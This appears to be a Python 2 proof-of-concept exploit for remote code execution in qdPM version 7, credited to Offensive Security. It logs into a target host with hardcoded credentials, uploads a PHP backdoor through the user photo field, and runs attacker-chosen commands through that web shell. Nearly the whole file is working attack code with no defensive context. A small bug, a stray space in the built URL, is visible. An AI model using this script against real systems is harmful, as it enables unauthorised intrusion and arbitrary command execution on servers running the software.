----- python script -----
#!/usr/bin/python
 
import re, mechanize
import urllib, sys
 
print "\n[*] qdPM v.7  Remote Code Execution"
print "[*] Vulnerability discovered by loneferret"
 
print "[*] Offensive Security - http://www.offensive-security.com\n"
if (len(sys.argv) != 3):
    print "[*] Usage: poc.py <RHOST> <RCMD>"
    exit(0)
 
rhost = sys.argv[1]
rcmd = sys.argv[2]
 
# Login into site
try:
        print "[*] Loging in ."
        br = mechanize.Browser()
        br.open("http://%s/qdPM/index.php/home/login" % rhost)
        assert br.viewing_html()
        br.select_form(name="UsersForm")
        br.select_form(nr=0)
        br.form['login[email]'] = "loneferret@test.com"
        br.form['login[password]'] = "123456"
        print "[*] Hope this works"
        br.submit()
 
except:
        print "[*] Oups..."
        exit(0)
 
# Upload malicious file
try:
        print "[*] Uploading shell .."
        br.open("http://%s/qdPM/home/myAccount" % rhost)
        assert br.viewing_html()
        br.select_form(name="UsersAccountForm")
        br.select_form(nr=0)
        br.form.add_file(open('backdoor.php'), "text/plain", "backdoor.php", name="users[photo]")
        br.submit(nr=0)
 
except:
        print "[-] Upload didn't work."
        exit(0)
 
# Get file name once saved
try:
        br.select_form(name="UsersAccountForm")
        for form in br.forms():
                filename = form.controls[9].value
                print "[*] Filename is now: " + filename
 
        url = "http://%s/qdPM/uploads/users " % rhost
        url += "/%s?cmd=%s" % (filename,rcmd)
        print "[*] Executing command:\n"
        resp = urllib.urlopen(url)
        print resp.read()
 
except:
        print "[-] Oups..."
        exit(0)
